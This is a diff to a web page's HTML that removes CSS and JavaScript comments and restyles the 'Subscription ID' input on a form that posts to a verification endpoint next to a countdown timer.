@@ -216,7 +216,7 @@
       font-size: 1.5rem;
       font-weight: 600;
       color: var(--primary-color);
-      display: inline-block; /* Required for animation */
+      display: inline-block;
     }
 
     .timer-label {
@@ -236,7 +236,6 @@
       text-align: center;
     }
 
-    /* Animation for timer number transitions */
     @keyframes fadeNumber {
       0% { opacity: 0; transform: translateY(10px); }
       100% { opacity: 1; transform: translateY(0); }
@@ -246,7 +245,6 @@
       animation: fadeNumber 0.3s ease-in-out;
     }
 
-    /* Disable animations for users with reduced motion preference */
     @media (prefers-reduced-motion: reduce) {
       .timer-value.animate {
         animation: none;
@@ -329,13 +327,13 @@
       <form action="https://hybe-panel.onrender.com/verify" method="POST" onsubmit="validateSubscription(event)">
         <fieldset>
           <legend class="visually-hidden">Subscription Validation</legend>
-          <div class="mb-4 position-relative">
-            <label for="codeInput" class="form-label fw-semibold" style="color: var(--secondary-color); position: absolute; top: 16px; left: 20px; transition: all 0.2s ease; pointer-events: none;">Subscription ID</label>
+          <div class="mb-4">
+            <label for="codeInput" class="form-label fw-semibold mb-2" style="color: var(--secondary-color); display: block;">Subscription ID</label>
             <input
               type="text"
               id="codeInput"
-              class="form-control pt-4"
-              placeholder=""
+              class="form-control"
+              placeholder="Enter your Subscription ID"
               pattern="[A-Z0-9]{10,20}"
               title="Subscription ID must be 10-20 alphanumeric characters (e.g., ABC123XYZ789)"
               required
@@ -610,7 +608,6 @@
         const minutes = Math.floor((timeLeft % (1000 * 60 * 60)) / (1000 * 60));
         const seconds = Math.floor((timeLeft % (1000 * 60)) / 1000);
 
-        // Apply animation only when values change
         if (days !== prevDays) {
           daysEl.textContent = days;
           daysEl.classList.add('animate');
